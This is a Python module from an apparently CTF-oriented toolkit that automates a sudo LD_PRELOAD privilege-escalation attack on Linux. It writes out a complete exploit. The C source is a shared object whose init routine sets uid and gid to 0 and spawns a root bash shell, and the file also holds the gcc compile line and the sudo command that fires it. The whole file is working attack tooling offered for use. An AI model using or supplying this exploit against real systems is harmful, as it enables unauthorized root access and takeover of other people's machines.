from pathlib import Path
import tempfile

from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax

from modules.upload.linux import stage_linux_files

console = Console()


def run(data, cred, args):

    target = args.extra[0] if args.extra else "<sudo_binary>"

    console.print(
        Panel.fit(
            "[bold cyan]Sudo LD_PRELOAD[/bold cyan]\n\n"
            "Compile a shared object on the target and execute it via\n"
            "a sudo-allowed binary that preserves LD_PRELOAD.",
            border_style="cyan",
        )
    )

    #
    # Create source
    #
    tmpdir = Path(tempfile.mkdtemp(prefix="ctfkit_"))

    source = tmpdir / "ldpreload.c"

    source.write_text(
        r"""#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
"""
    )

    #
    # Transfer
    #
    choice = input(
        "\nTransfer ldpreload.c to target? [Y/n]: "
    ).strip().lower()

    if choice in ("", "y", "yes"):
        stage_linux_files([source])

    #
    # Compile
    #
    compile = r"""gcc -fPIC -shared -nostartfiles -o /tmp/ctfkit_ldpreload.so ldpreload.c
"""

    console.print(
        Panel.fit(
            "Compile on Target",
            border_style="blue",
        )
    )

    console.print(
        Syntax(
            compile,
            "bash",
            theme="monokai",
        )
    )

    #
    # Exploit
    #
    exploit = f"""sudo LD_PRELOAD=/tmp/ctfkit_ldpreload.so {target}
"""

    console.print(
        Panel.fit(
            "Exploit",
            border_style="red",
        )
    )

    console.print(
        Syntax(
            exploit,
            "bash",
            theme="monokai",
        )
    )

    console.print(
        Panel.fit(
            "[bold yellow]Notes[/bold yellow]\n\n"
            "• The target binary must be executable via sudo.\n"
            "• LD_PRELOAD must not be stripped by sudo.\n"
            "• gcc must be available on the target.\n"
            "• Upload ldpreload.c before compiling.",
            border_style="yellow",
            title="Tips",
        )
    )